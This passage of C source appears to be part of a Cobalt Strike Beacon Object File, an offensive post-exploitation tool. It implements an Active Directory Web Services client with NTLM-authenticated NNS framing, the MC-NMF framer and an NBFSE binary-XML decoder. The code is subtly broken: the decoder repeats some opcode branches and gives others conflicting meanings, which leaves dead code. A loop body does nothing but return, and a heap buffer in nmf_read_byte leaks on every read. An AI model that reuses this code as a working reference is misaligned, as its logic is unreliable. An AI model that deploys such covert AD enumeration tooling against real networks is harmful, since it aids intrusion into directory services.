	static int nns_send_handshake(NnsCtx* nns, u8 msg_id, const u8* tok, size_t tok_len) {
		u8 hdr[5];
		hdr[0] = msg_id; hdr[1] = 1; hdr[2] = 0;
		hdr[3] = (u8)(tok_len >> 8); hdr[4] = (u8)(tok_len & 0xFF);
		if (!tcp_send_all(nns->sock, hdr, 5)) return FALSE;
		if (tok_len) return tcp_send_all(nns->sock, tok, tok_len);
		return TRUE;
	}
	static int nns_recv_handshake(NnsCtx* nns, u8* msg_id_out, Buf* tok_out) {
		u8 hdr[5];
		if (!tcp_recv_exact(nns->sock, hdr, 5)) return FALSE;
		*msg_id_out = hdr[0];
		u16 len = ((u16)hdr[3] << 8) | (u16)hdr[4];
		if (!len) return TRUE;
		u8* tmp = (u8*)adws_alloc(len);
		if (!tmp) return FALSE;
		int ok = tcp_recv_exact(nns->sock, tmp, len) && buf_append(tok_out, tmp, len);
		adws_free(tmp);
		return ok;
	}
	static int nns_authenticate(NnsCtx* nns) {
		/* Step 1: send NTLM NEGOTIATE */
		Buf tok = buf_new();
		if (!ntlm_get_token(nns->ntlm, NULL, 0, &tok)) { buf_free(&tok); return FALSE; }
		if (!nns_send_handshake(nns, NNS_IN_PROGRESS, tok.data, tok.len)) { buf_free(&tok); return FALSE; }
		buf_free(&tok);

		for (;;) {
			u8 msg_id = 0;
			Buf srv = buf_new();
			if (!nns_recv_handshake(nns, &msg_id, &srv)) { buf_free(&srv); return FALSE; }

			if (msg_id == NNS_DONE) { buf_free(&srv); return TRUE; }
			if (msg_id == NNS_ERROR) { buf_free(&srv); return FALSE; }
			if (msg_id != NNS_IN_PROGRESS) { buf_free(&srv); return FALSE; }
			/* Process challenge → response */
			tok = buf_new();
			int ok = ntlm_get_token(nns->ntlm, srv.data, srv.len, &tok);
			buf_free(&srv);
			if (!ok) { buf_free(&tok); return FALSE; }
			if (tok.len) {
				ok = nns_send_handshake(nns, NNS_IN_PROGRESS, tok.data, tok.len);
			}
			buf_free(&tok);
			if (!ok) return FALSE;
		}
	}
	static int nns_send(NnsCtx* nns, const u8* data, size_t len) {
		Buf sealed = buf_new();
		if (!ntlm_seal(nns->ntlm, data, len, &sealed)) {
			buf_free(&sealed); return FALSE;
		}

		u32 plen = (u32)sealed.len;
		u8 hdr[4];
		hdr[0] = (u8)(plen); hdr[1] = (u8)(plen >> 8); hdr[2] = (u8)(plen >> 16); hdr[3] = (u8)(plen >> 24);
		int ok = tcp_send_all(nns->sock, hdr, 4) && tcp_send_all(nns->sock, sealed.data, sealed.len);
		buf_free(&sealed);
		return ok;
	}
	static int nns_recv_packet(NnsCtx* nns, Buf* out) {

		u8 hdr[4];

		if (!tcp_recv_exact(nns->sock, hdr, 4)) {

			return FALSE;
		}
		u32 plen = (u32)hdr[0] | (u32)hdr[1] << 8 | (u32)hdr[2] << 16 | (u32)hdr[3] << 24;

		if (plen < 16 || plen > nns->max_payload) return FALSE;
		u8* tmp = (u8*)adws_alloc(plen);
		if (!tmp) return FALSE;
		int ok = tcp_recv_exact(nns->sock, tmp, plen);
		if (ok) ok = ntlm_unseal(nns->ntlm, tmp, plen, out);
		adws_free(tmp);

		return ok;
	}
	/* High-level recv that reassembles NMF SizedEnvelope across multiple NNS pkts */

	static size_t nns_recv(NnsCtx* nns, u8* buf, size_t wanted) {

		if (nns->rpos < nns->rbuf.len) {
			size_t avail = nns->rbuf.len - nns->rpos;
			size_t n = avail < wanted ? avail : wanted;
			adws_memcpy(buf, nns->rbuf.data + nns->rpos, n);
			nns->rpos += n;
			return n;
		}

		buf_free(&nns->rbuf); nns->rbuf = buf_new(); nns->rpos = 0;

		int ok = nns_recv_packet(nns, &nns->rbuf);

		if (!ok) return (size_t)-1;


		if (nns->rbuf.len >= 2 && nns->rbuf.data[0] == 0x06) {
			size_t consumed = 0;
			u32 nmf_size = varint_decode(nns->rbuf.data + 1, nns->rbuf.len - 1, &consumed);
			if (consumed > 0) {
				size_t total = 1 + consumed + nmf_size;
				while (nns->rbuf.len < total) {
					if (!nns_recv_packet(nns, &nns->rbuf)) return (size_t)-1;
				}
			}
		}
		size_t n = nns->rbuf.len < wanted ? nns->rbuf.len : wanted;
		adws_memcpy(buf, nns->rbuf.data, n);
		nns->rpos = n;

		return n;
	}

	/* ─── NMF Framer (MC-NMF) ---──────────────── */

#define NMF_VERSION         0x00
#define NMF_MODE            0x01
#define NMF_VIA             0x02
#define NMF_KNOWN_ENC       0x03
#define NMF_SIZED_ENVELOPE  0x06
#define NMF_UPGRADE_REQ     0x09
#define NMF_UPGRADE_RESP    0x0A
#define NMF_PREAMBLE_ACK    0x0B
#define NMF_PREAMBLE_END    0x0C
#define NMF_FAULT           0x08
#define NMF_ENC_SOAP12_NBFSE 0x08

	typedef struct {
		SOCKET    sock;
		NnsCtx* nns;   /* NULL until after upgrade */
		u32       max_frame;
		Buf       rbuf;
		size_t    rpos;
	} NmfCtx;

	/* Read exactly 1 byte from the active transport (post-auth uses NNS) */
	static int nmf_read_byte(NmfCtx* ctx, u8* out) {

		while (ctx->rpos >= ctx->rbuf.len) {

			HANDLE hHeap = KERNEL32$GetProcessHeap();

			// 3. Allocate 65536 bytes on the heap (using flag 8 for HEAP_ZERO_MEMORY)
			u8* tmp = (u8*)KERNEL32$HeapAlloc(hHeap, 8, 65536);
			size_t n;
			if (ctx->nns) {
				n = nns_recv(ctx->nns, tmp, 65536);
				if (n == (size_t)-1) return FALSE;
			}
			else {

				i32 r = pfn_recv(ctx->sock, (char*)tmp, 65536, 0);
				if (r <= 0) return FALSE;
				n = (size_t)r;
			}
			/* Compact buffer */
			if (ctx->rpos > 0 && ctx->rpos <= ctx->rbuf.len) {
				size_t remaining = ctx->rbuf.len - ctx->rpos;
				adws_memcpy(ctx->rbuf.data, ctx->rbuf.data + ctx->rpos, remaining);
				ctx->rbuf.len = remaining; ctx->rpos = 0;
			}
			if (!buf_append(&ctx->rbuf, tmp, n)) return FALSE;
		}
		*out = ctx->rbuf.data[ctx->rpos++];
		return TRUE;
	}

	static int nmf_send_raw(NmfCtx* ctx, const u8* data, size_t len) {
		if (ctx->nns) return nns_send(ctx->nns, data, len);
		return tcp_send_all(ctx->sock, data, len);
	}

	static int nmf_connect(NmfCtx* ctx, const char* via, NnsCtx* nns_ctx) {
		/* Version record */
		{ u8 r[3] = { NMF_VERSION,1,0 }; if (!tcp_send_all(ctx->sock, r, 3)) return FALSE; }
		/* Mode = Duplex (0x02) */
		{ u8 r[2] = { NMF_MODE, 0x02 }; if (!tcp_send_all(ctx->sock, r, 2)) return FALSE; }
		{
			size_t vlen = adws_strlen(via);
			Buf rec = buf_new();
			if (!buf_push(&rec, (u8)NMF_VIA)) { buf_free(&rec); return FALSE; }
			if (!varint_encode(&rec, (u32)vlen)) { buf_free(&rec); return FALSE; }
			if (!buf_append(&rec, (const u8*)via, vlen)) { buf_free(&rec); return FALSE; }
			int ok = tcp_send_all(ctx->sock, rec.data, rec.len);
			buf_free(&rec); if (!ok) return FALSE;
		}

		/* KnownEncoding = SOAP12 NBFSE in-band dict (0x08) */
		{ u8 r[2] = { NMF_KNOWN_ENC,NMF_ENC_SOAP12_NBFSE }; if (!tcp_send_all(ctx->sock, r, 2)) return FALSE; }

		/* UpgradeRequest "application/negotiate" */
		{
			const char proto[] = { 'a','p','p','l','i','c','a','t','i','o','n','/','n','e','g','o','t','i','a','t','e' };
			Buf rec = buf_new();
			buf_push(&rec, (u8)NMF_UPGRADE_REQ);
			varint_encode(&rec, (u32)sizeof(proto));
			buf_append(&rec, (const u8*)proto, sizeof(proto));
			int ok = tcp_send_all(ctx->sock, rec.data, rec.len);
			buf_free(&rec); if (!ok) return FALSE;
		}
		/* Expect UpgradeResponse */
		{
			u8 rtype;
			if (!nmf_read_byte(ctx, &rtype) || rtype != NMF_UPGRADE_RESP) return FALSE;
		}
		/* NNS auth */

		ctx->nns = nns_ctx;

		if (!nns_authenticate(nns_ctx)) return FALSE;

		/* PreambleEnd */
		{ u8 b = (u8)NMF_PREAMBLE_END; if (!nmf_send_raw(ctx, &b, 1)) return FALSE; }
		/* Expect PreambleAck */
		{
			u8 rtype;
			if (!nmf_read_byte(ctx, &rtype) || rtype != NMF_PREAMBLE_ACK) return FALSE;
		}
		return TRUE;
	}

	static int nmf_send_envelope(NmfCtx* ctx, const u8* payload, size_t payload_len) {
		Buf frame = buf_new();
		buf_push(&frame, (u8)NMF_SIZED_ENVELOPE);
		varint_encode(&frame, (u32)payload_len);
		buf_append(&frame, payload, payload_len);

		int ok = nmf_send_raw(ctx, frame.data, frame.len);
		buf_free(&frame);
		return ok;
	}

	static int nmf_recv_envelope(NmfCtx* ctx, Buf* out) {
		u8 rtype;
		if (!nmf_read_byte(ctx, &rtype)) return FALSE;
		if (rtype == NMF_FAULT) {
			/* read fault string and discard */
			u8 b; u32 sz = 0; int shift = 0;
			for (;;) {
				if (!nmf_read_byte(ctx, &b)) break;
				sz |= (u32)(b & 0x7F) << shift; shift += 7;
				if (!(b & 0x80)) break;
			}
			for (u32 i = 0;i < sz && sz < 65536;i++) nmf_read_byte(ctx, &b);
			return FALSE;
		}
		if (rtype != NMF_SIZED_ENVELOPE) return FALSE;
		/* Read VarInt size */
		u32 size = 0; int shift = 0;
		for (;;) {
			u8 b;
			if (!nmf_read_byte(ctx, &b)) return FALSE;
			size |= (u32)(b & 0x7F) << shift; shift += 7;
			if (!(b & 0x80)) break;
			if (shift >= 35) return FALSE;
		}
		if (size > ctx->max_frame) return FALSE;
		/* Read payload */
		for (u32 i = 0; i < size; i++) {
			u8 b; if (!nmf_read_byte(ctx, &b)) return FALSE;
			if (!buf_push(out, b)) return FALSE;
		}
		return TRUE;
	}


	typedef struct {
		const u8* data;
		size_t     len;
		size_t     pos;
		
		char* dict_buf;
		char** dict;        /* dict[i] = string for index i */
		u32        dict_count;
	} NbfseReader;

	static int nbfse_read_byte(NbfseReader* r, u8* out) {
		if (r->pos >= r->len) return FALSE;
		*out = r->data[r->pos++]; return TRUE;
	}
	static int nbfse_read_u8(NbfseReader* r, u32* out) {
		u8 b; if (!nbfse_read_byte(r, &b)) return FALSE; *out = (u32)b; return TRUE;
	}
	static int nbfse_read_u16le(NbfseReader* r, u32* out) {
		u8 a, b;
		if (!nbfse_read_byte(r, &a) || !nbfse_read_byte(r, &b)) return FALSE;
		*out = (u32)a | (u32)b << 8; return TRUE;
	}
	static int nbfse_read_u32le(NbfseReader* r, u32* out) {
		u8 a, b, c, d;
		if (!nbfse_read_byte(r, &a) || !nbfse_read_byte(r, &b) || !nbfse_read_byte(r, &c) || !nbfse_read_byte(r, &d)) return FALSE;
		*out = (u32)a | (u32)b << 8 | (u32)c << 16 | (u32)d << 24; return TRUE;
	}
	static int nbfse_read_varint(NbfseReader* r, u32* out) {
		u32 v = 0; int shift = 0;
		for (;;) {
			u8 b; if (!nbfse_read_byte(r, &b)) return FALSE;
			v |= (u32)(b & 0x7F) << shift; shift += 7;
			if (!(b & 0x80)) { *out = v; return TRUE; }
			if (shift >= 35) return FALSE;
		}
	}
	static int nbfse_read_utf8(NbfseReader* r, u32 len, Buf* out) {
		for (u32 i = 0;i < len;i++) {
			u8 b; if (!nbfse_read_byte(r, &b)) return FALSE;
			if (!buf_push(out, (u8)b)) return FALSE;
		}
		return TRUE;
	}

	/* read inband dictionary that prefixes each NBFSE payload */
	static int nbfse_read_inband_dict(NbfseReader* r) {
		u32 dict_len; if (!nbfse_read_varint(r, &dict_len)) return FALSE;
		if (!dict_len) return TRUE;
		r->dict_buf = (char*)adws_alloc(dict_len + 1);
		if (!r->dict_buf) return FALSE;
		for (u32 i = 0;i < dict_len;i++) {
			u8 b; if (!nbfse_read_byte(r, &b)) return FALSE;
			r->dict_buf[i] = (char)b;
		}
		r->dict_buf[dict_len] = 0;
		/* count strings — NUL terminators, plus one more if last byte isn't NUL */
		u32 count = 0;
		for (u32 i = 0; i < dict_len; i++) if (!r->dict_buf[i]) count++;
		if (dict_len > 0 && r->dict_buf[dict_len - 1] != 0) count++;
		/* allocate and zero pointer array */
		r->dict = (char**)adws_alloc((count + 2) * sizeof(char*));
		if (!r->dict) return FALSE;
		adws_memset(r->dict, 0, (count + 2) * sizeof(char*));
		r->dict_count = count;
		u32 idx = 0; char* p = r->dict_buf;
		while (idx < count && (size_t)(p - r->dict_buf) < dict_len) {
			r->dict[idx++] = p;
			while (*p && (size_t)(p - r->dict_buf) < dict_len) p++;
			if ((size_t)(p - r->dict_buf) < dict_len) p++; /* skip NUL safely */
		}
		for (u32 i = 0; i < count && i < 20; i++)
			return TRUE;
		return TRUE;
	}

	static const char* nbfse_dict_lookup(NbfseReader* r, u32 idx) {
		if (idx % 2 == 0) {
			for (int i = 0; kStaticDict[i].str; i++) {
				if (kStaticDict[i].idx == idx) return kStaticDict[i].str;
			}
		}
		u32 entry = idx >> 1;
		if (entry < r->dict_count) return r->dict[entry];
		return "?";
	}
	static int nbfse_decode_value(NbfseReader* r, u8 opcode, Buf* xml, int with_end);

	static int nbfse_emit_text(NbfseReader* r, u8 opcode, Buf* xml) {
		int with_end = (opcode & 1); /* odd opcodes have WithEndElement */
		return nbfse_decode_value(r, opcode, xml, with_end);
	}
	static int nbfse_decode_value(NbfseReader* r, u8 opcode, Buf* xml, int with_end) {
		u8 base = opcode & ~1u; /* mask off WithEndElement bit for paired opcodes */

		if (base == 0x80) { /* ZeroText */
			buf_push(xml, '0');
		}
		else if (base == 0x82) { /* OneText */
			buf_push(xml, '1');
		}
		else if (base == 0x84) { /* FalseText */
			buf_append_str(xml, "FALSE");
		}
		else if (base == 0x86) { /* TrueText */
			buf_append_str(xml, "TRUE");
		}
		else if (base == 0x88) { /* Int8Text */
			u32 v; if (!nbfse_read_u8(r, &v)) return FALSE;
			char tmp[12]; u32_to_str(v, tmp, sizeof(tmp));
			buf_append_str(xml, tmp);
		}
		else if (base == 0x8A) { /* Int16Text */
			u32 v; if (!nbfse_read_u16le(r, &v)) return FALSE;
			char tmp[12]; u32_to_str(v, tmp, sizeof(tmp));
			buf_append_str(xml, tmp);
		}
		else if (base == 0x8C) { /* Int32Text */
			u32 v; if (!nbfse_read_u32le(r, &v)) return FALSE;
			char tmp[12]; u32_to_str(v, tmp, sizeof(tmp));
			buf_append_str(xml, tmp);
		}
		else if (base == 0x8E) { /* Int64Text */
			u8 bytes[8];
			for (int i = 0; i < 8; i++) {
				u8 b; if (!nbfse_read_byte(r, &b)) return FALSE;
				bytes[i] = b;
			}
			u64 v = 0;
			for (int i = 7; i >= 0; i--) v = (v << 8) | bytes[i];
			if (v == 0) {
				buf_push(xml, '0');
			}
			else {
				char dtmp[24]; int dn = 0;
				u64 dv = v;
				while (dv) { dtmp[dn++] = (char)('0' + (dv % 10)); dv /= 10; }
				for (int i = dn - 1; i >= 0; i--) buf_push(xml, (u8)dtmp[i]);
			}
		}
		else if (base == 0x90) { /* UInt64Text */
			u8 bytes[8];
			for (int i = 0; i < 8; i++) {
				u8 b; if (!nbfse_read_byte(r, &b)) return FALSE;
				bytes[i] = b;
			}
			u64 v = 0;
			for (int i = 7; i >= 0; i--) v = (v << 8) | bytes[i];
			if (v == 0) {
				buf_push(xml, '0');
			}
			else {
				char dtmp[24]; int dn = 0;
				u64 dv = v;
				while (dv) { dtmp[dn++] = (char)('0' + (dv % 10)); dv /= 10; }
				for (int i = dn - 1; i >= 0; i--) buf_push(xml, (u8)dtmp[i]);
			}
		}
		else if (base == 0x92) { /* FloatText — 4 bytes */
			u8 b[4];
			for (int i = 0; i < 4; i++) { if (!nbfse_read_byte(r, &b[i])) return FALSE; }
			buf_append_str(xml, "0x");
			char tmp[9]; u64_to_hex(
				(u64)b[0] << 24 | (u64)b[1] << 16 | (u64)b[2] << 8 | (u64)b[3], tmp, 8);
			buf_append_str(xml, tmp);
		}
		else if (base == 0x94) { /* DoubleText — 8 bytes */
			u8 b[8];
			for (int i = 0; i < 8; i++) { if (!nbfse_read_byte(r, &b[i])) return FALSE; }
			buf_append_str(xml, "0x");
			char tmp[17]; u64_to_hex(
				(u64)b[0] << 56 | (u64)b[1] << 48 | (u64)b[2] << 40 | (u64)b[3] << 32 |
				(u64)b[4] << 24 | (u64)b[5] << 16 | (u64)b[6] << 8 | (u64)b[7], tmp, 16);
			buf_append_str(xml, tmp);
		}
		else if (base == 0x96) { /* DecimalText — 16 bytes, skip */
			u8 b[16];
			for (int i = 0; i < 16; i++) { if (!nbfse_read_byte(r, &b[i])) return FALSE; }
		}
		else if (base == 0x98) { /* Chars8Text */
			u32 len; if (!nbfse_read_u8(r, &len)) return FALSE;
			if (!nbfse_read_utf8(r, len, xml)) return FALSE;
		}
		else if (base == 0x9A) { /* Chars16Text */
			u32 len; if (!nbfse_read_u16le(r, &len)) return FALSE;
			if (!nbfse_read_utf8(r, len, xml)) return FALSE;
		}
		else if (base == 0x9C) { /* Chars32Text */
			u32 len; if (!nbfse_read_u32le(r, &len)) return FALSE;
			if (!nbfse_read_utf8(r, len, xml)) return FALSE;
		}
		else if (base == 0xA0) { /* Bytes16Text — length u16, emit base64 */
			u32 len; if (!nbfse_read_u16le(r, &len)) return FALSE;
			if (len > 1024 * 1024) return FALSE; /* sanity cap 1MB */
			u8* bytes = (u8*)adws_alloc(len + 1);
			if (!bytes) return FALSE;
			for (u32 i = 0; i < len; i++) {
				u8 b; if (!nbfse_read_byte(r, &b)) { adws_free(bytes); return FALSE; }
				bytes[i] = b;
			}
			base64_encode(xml, bytes, len);
			adws_free(bytes);
		}
		else if (base == 0xA2) { /* Bytes32Text — length u32, emit base64 */
			u32 len; if (!nbfse_read_u32le(r, &len)) return FALSE;
			if (len > 4 * 1024 * 1024) return FALSE; /* sanity cap 4MB */
			u8* bytes = (u8*)adws_alloc(len + 1);
			if (!bytes) return FALSE;
			for (u32 i = 0; i < len; i++) {
				u8 b; if (!nbfse_read_byte(r, &b)) { adws_free(bytes); return FALSE; }
				bytes[i] = b;
			}
			base64_encode(xml, bytes, len);
			adws_free(bytes);
		}
		else if (base == 0xA4) { /* EmptyText — nothing to emit */
		}
		else if (base == 0xA6) { /* TimeSpanText — 8 bytes LE */
			u8 b[8];
			for (int i = 0; i < 8; i++) { if (!nbfse_read_byte(r, &b[i])) return FALSE; }
			u64 v = (u64)b[0] | (u64)b[1] << 8 | (u64)b[2] << 16 | (u64)b[3] << 24 |
				(u64)b[4] << 32 | (u64)b[5] << 40 | (u64)b[6] << 48 | (u64)b[7] << 56;
			if (v == 0) {
				buf_push(xml, '0');
			}
			else {
				char dtmp[24]; int dn = 0;
				while (v) { dtmp[dn++] = (char)('0' + (v % 10)); v /= 10; }
				for (int i = dn - 1; i >= 0; i--) buf_push(xml, (u8)dtmp[i]);
			}
		}
		else if (base == 0xA8) { /* DateTimeText — 8 bytes LE */
			u8 b[8];
			for (int i = 0; i < 8; i++) { if (!nbfse_read_byte(r, &b[i])) return FALSE; }
			u64 v = (u64)b[0] | (u64)b[1] << 8 | (u64)b[2] << 16 | (u64)b[3] << 24 |
				(u64)b[4] << 32 | (u64)b[5] << 40 | (u64)b[6] << 48 | (u64)b[7] << 56;
			if (v == 0) {
				buf_push(xml, '0');
			}
			else {
				char dtmp[24]; int dn = 0;
				while (v) { dtmp[dn++] = (char)('0' + (v % 10)); v /= 10; }
				for (int i = dn - 1; i >= 0; i--) buf_push(xml, (u8)dtmp[i]);
			}
		}
		else if (base == 0xAA) { /* DictionaryText — static dict varint index */
			u32 idx; if (!nbfse_read_varint(r, &idx)) return FALSE;
			const char* s = nbfse_dict_lookup(r, idx);
			if (!buf_append_str(xml, s)) return FALSE;
		}
		else if (base == 0xAC) { /* UniqueIdText (GUID) — 16 bytes Windows byte-order */
			u8 bytes[16];
			for (int i = 0; i < 16; i++) {
				u8 b; if (!nbfse_read_byte(r, &b)) return FALSE;
				bytes[i] = b;
			}
			u32 d1 = (u32)bytes[0] | (u32)bytes[1] << 8 | (u32)bytes[2] << 16 | (u32)bytes[3] << 24;
			u16 d2 = (u16)bytes[4] | (u16)bytes[5] << 8;
			u16 d3 = (u16)bytes[6] | (u16)bytes[7] << 8;
			buf_append_str(xml, "urn:uuid:");
			char tmp[40];
			u64_to_hex(d1, tmp, 8); tmp[8] = '-'; buf_append(xml, (u8*)tmp, 9);
			u64_to_hex(d2, tmp, 4); tmp[4] = '-'; buf_append(xml, (u8*)tmp, 5);
			u64_to_hex(d3, tmp, 4); tmp[4] = '-'; buf_append(xml, (u8*)tmp, 5);
			u64_to_hex(((u64)bytes[8] << 8) | bytes[9], tmp, 4); tmp[4] = '-';
			buf_append(xml, (u8*)tmp, 5);
			u64_to_hex(
				((u64)bytes[10] << 40) | ((u64)bytes[11] << 32) | ((u64)bytes[12] << 24) |
				((u64)bytes[13] << 16) | ((u64)bytes[14] << 8) | bytes[15],
				tmp, 12);
			buf_append(xml, (u8*)tmp, 12);
		}
		else if (base == 0x9E) { /* Bytes8Text — length u8, emit base64 */
			u32 len; if (!nbfse_read_u8(r, &len)) return FALSE;
			u8* bytes = (u8*)adws_alloc(len + 1);
			if (!bytes) return FALSE;
			for (u32 i = 0; i < len; i++) {
				u8 b; if (!nbfse_read_byte(r, &b)) { adws_free(bytes); return FALSE; }
				bytes[i] = b;
			}
			base64_encode(xml, bytes, len);
			adws_free(bytes);
		}
		else if (base == 0xA0) { /* Bytes16Text — length u16, emit base64 */
			u32 len; if (!nbfse_read_u16le(r, &len)) return FALSE;
			u8* bytes = (u8*)adws_alloc(len + 1);
			if (!bytes) return FALSE;
			for (u32 i = 0; i < len; i++) {
				u8 b; if (!nbfse_read_byte(r, &b)) { adws_free(bytes); return FALSE; }
				bytes[i] = b;
			}
			base64_encode(xml, bytes, len);
			adws_free(bytes);
		}
		else if (base == 0xA2) { /* Bytes32Text — length u32, emit base64 */
			u32 len; if (!nbfse_read_u32le(r, &len)) return FALSE;
			u8* bytes = (u8*)adws_alloc(len + 1);
			if (!bytes) return FALSE;
			for (u32 i = 0; i < len; i++) {
				u8 b; if (!nbfse_read_byte(r, &b)) { adws_free(bytes); return FALSE; }
				bytes[i] = b;
			}
			base64_encode(xml, bytes, len);
			adws_free(bytes);
		}
		else if (base == 0xA4) { /* EmptyText — nothing to emit */
		}
		else if (base == 0xA6) { /* Inband dictionary text — varint index */
			u32 idx; if (!nbfse_read_varint(r, &idx)) return FALSE;
			u32 entry = idx >> 1;
			if (entry < r->dict_count && r->dict[entry])
				buf_append_str(xml, r->dict[entry]);
		}
		else if (base == 0xA8) { /* UniqueIdText — 16 bytes → urn:uuid: */
			u8 bytes[16];
			for (int i = 0; i < 16; i++) {
				u8 b; if (!nbfse_read_byte(r, &b)) return FALSE;
				bytes[i] = b;
			}
			u32 d1 = (u32)bytes[0] | (u32)bytes[1] << 8 | (u32)bytes[2] << 16 | (u32)bytes[3] << 24;
			u16 d2 = (u16)bytes[4] | (u16)bytes[5] << 8;
			u16 d3 = (u16)bytes[6] | (u16)bytes[7] << 8;
			buf_append_str(xml, "urn:uuid:");
			char tmp[40];
			u64_to_hex(d1, tmp, 8); tmp[8] = '-'; buf_append(xml, (u8*)tmp, 9);
			u64_to_hex(d2, tmp, 4); tmp[4] = '-'; buf_append(xml, (u8*)tmp, 5);
			u64_to_hex(d3, tmp, 4); tmp[4] = '-'; buf_append(xml, (u8*)tmp, 5);
			u64_to_hex(((u64)bytes[8] << 8) | bytes[9], tmp, 4); tmp[4] = '-';
			buf_append(xml, (u8*)tmp, 5);
			u64_to_hex(
				((u64)bytes[10] << 40) | ((u64)bytes[11] << 32) | ((u64)bytes[12] << 24) |
				((u64)bytes[13] << 16) | ((u64)bytes[14] << 8) | bytes[15],
				tmp, 12);
			buf_append(xml, (u8*)tmp, 12);
		}
		else if (base == 0xAA) { /* TimeSpanText — 8 bytes LE */
			u8 b[8];
			for (int i = 0; i < 8; i++) { if (!nbfse_read_byte(r, &b[i])) return FALSE; }
			u64 v = (u64)b[0] | (u64)b[1] << 8 | (u64)b[2] << 16 | (u64)b[3] << 24 |
				(u64)b[4] << 32 | (u64)b[5] << 40 | (u64)b[6] << 48 | (u64)b[7] << 56;
			if (v == 0) {
				buf_push(xml, '0');
			}
			else {
				char dtmp[24]; int dn = 0;
				while (v) { dtmp[dn++] = (char)('0' + (v % 10)); v /= 10; }
				for (int i = dn - 1; i >= 0; i--) buf_push(xml, (u8)dtmp[i]);
			}
		}
		else if (base == 0xAC) { /* DateTimeText — 8 bytes LE */
			u8 b[8];
			for (int i = 0; i < 8; i++) { if (!nbfse_read_byte(r, &b[i])) return FALSE; }
			u64 v = (u64)b[0] | (u64)b[1] << 8 | (u64)b[2] << 16 | (u64)b[3] << 24 |
				(u64)b[4] << 32 | (u64)b[5] << 40 | (u64)b[6] << 48 | (u64)b[7] << 56;
			if (v == 0) {
				buf_push(xml, '0');
			}
			else {
				char dtmp[24]; int dn = 0;
				while (v) { dtmp[dn++] = (char)('0' + (v % 10)); v /= 10; }
				for (int i = dn - 1; i >= 0; i--) buf_push(xml, (u8)dtmp[i]);
			}
		}
		else if (base == 0xAE) { /* DictionaryText — static dict varint index */
			u32 idx; if (!nbfse_read_varint(r, &idx)) return FALSE;
			const char* s = nbfse_dict_lookup(r, idx);
			if (!buf_append_str(xml, s)) return FALSE;
		}
		else if (base == 0xB0) { /* UniqueIdText (GUID) — 16 bytes Windows byte-order */
			u8 bytes[16];
			for (int i = 0; i < 16; i++) {
				u8 b; if (!nbfse_read_byte(r, &b)) return FALSE;
				bytes[i] = b;
			}
			u32 d1 = (u32)bytes[0] | (u32)bytes[1] << 8 | (u32)bytes[2] << 16 | (u32)bytes[3] << 24;
			u16 d2 = (u16)bytes[4] | (u16)bytes[5] << 8;
			u16 d3 = (u16)bytes[6] | (u16)bytes[7] << 8;
			buf_append_str(xml, "urn:uuid:");
			char tmp[40];
			u64_to_hex(d1, tmp, 8); tmp[8] = '-'; buf_append(xml, (u8*)tmp, 9);
			u64_to_hex(d2, tmp, 4); tmp[4] = '-'; buf_append(xml, (u8*)tmp, 5);
			u64_to_hex(d3, tmp, 4); tmp[4] = '-'; buf_append(xml, (u8*)tmp, 5);
			u64_to_hex(((u64)bytes[8] << 8) | bytes[9], tmp, 4); tmp[4] = '-';
			buf_append(xml, (u8*)tmp, 5);
			u64_to_hex(
				((u64)bytes[10] << 40) | ((u64)bytes[11] << 32) | ((u64)bytes[12] << 24) |
				((u64)bytes[13] << 16) | ((u64)bytes[14] << 8) | bytes[15],
				tmp, 12);
			buf_append(xml, (u8*)tmp, 12);
		}
		else if (base == 0xB4) { /* BooleanFalseText */
			buf_append_str(xml, "FALSE");
		}
		else if (base == 0xB6) { /* BooleanTrueText */
			buf_append_str(xml, "TRUE");
		}
		else if (base == 0xB8) { /* Char — 2 bytes UTF-16LE */
			u32 cp; if (!nbfse_read_u16le(r, &cp)) return FALSE;
			if (cp < 0x80) {
				buf_push(xml, (u8)cp);
			}
			else if (cp < 0x800) {
				buf_push(xml, (u8)(0xC0 | (cp >> 6)));
				buf_push(xml, (u8)(0x80 | (cp & 0x3F)));
			}
			else {
				buf_push(xml, (u8)(0xE0 | (cp >> 12)));
				buf_push(xml, (u8)(0x80 | ((cp >> 6) & 0x3F)));
				buf_push(xml, (u8)(0x80 | (cp & 0x3F)));
			}
		}
		else if (base == 0xBA) { /* Utf16Text — length u8 byte count */
			u32 len; if (!nbfse_read_u8(r, &len)) return FALSE;
			for (u32 i = 0; i < len; i++) {
				u8 lo; if (!nbfse_read_byte(r, &lo)) return FALSE;
				buf_push(xml, lo); /* emit low byte only for ASCII range */
				i++;
				if (i < len) {
					u8 hi; if (!nbfse_read_byte(r, &hi)) return FALSE;
					(void)hi; /* skip high byte */
				}
			}
		}
		else if (base == 0xBC) { /* Base64BinaryText — length u8 */
			u32 len; if (!nbfse_read_u8(r, &len)) return FALSE;
			u8* bytes = (u8*)adws_alloc(len + 1);
			if (!bytes) return FALSE;
			for (u32 i = 0; i < len; i++) {
				u8 b; if (!nbfse_read_byte(r, &b)) { adws_free(bytes); return FALSE; }
				bytes[i] = b;
			}
			base64_encode(xml, bytes, len);
			adws_free(bytes);
		}
		else {
			/* Unknown opcode — log and skip to avoid corrupting output */
			BeaconPrintf(CALLBACK_OUTPUT,
				"[nbfse] unknown value opcode 0x%02X at pos %llu\n",
				opcode, (u64)r->pos);
		}

		if (with_end) return 2;
		return TRUE;
	}
	/* Forward declaration */
	static int nbfse_decode_node(NbfseReader* r, Buf* xml, int depth);

	static int nbfse_decode_attr(NbfseReader* r, u8 opcode, Buf* xml) {
		if (opcode == 0x04) {
			u32 len;
			if (!nbfse_read_varint(r, &len)) return FALSE;
			buf_push(xml, ' ');
			nbfse_read_utf8(r, len, xml);
		}
		else if (opcode == 0x05) {
			u32 plen;
			if (!nbfse_read_varint(r, &plen)) return FALSE;
			buf_push(xml, ' ');
			nbfse_read_utf8(r, plen, xml);
			buf_push(xml, ':');
			u32 llen;
			if (!nbfse_read_varint(r, &llen)) return FALSE;
			nbfse_read_utf8(r, llen, xml);
		}
		else if (opcode == 0x06) {
			u32 idx;
			if (!nbfse_read_varint(r, &idx)) return FALSE;
			buf_push(xml, ' ');
			buf_append_str(xml, nbfse_dict_lookup(r, idx));
		}
		else if (opcode == 0x07) {
			u32 plen;
			if (!nbfse_read_varint(r, &plen)) return FALSE;
			buf_push(xml, ' ');
			nbfse_read_utf8(r, plen, xml);
			buf_push(xml, ':');
			u32 idx;
			if (!nbfse_read_varint(r, &idx)) return FALSE;
			buf_append_str(xml, nbfse_dict_lookup(r, idx));
		}
		else if (opcode == 0x08) {
			u32 len;
			if (!nbfse_read_varint(r, &len)) return FALSE;
			buf_append_str(xml, " xmlns=\"");
			nbfse_read_utf8(r, len, xml);
			buf_push(xml, '"');
			return TRUE;
		}
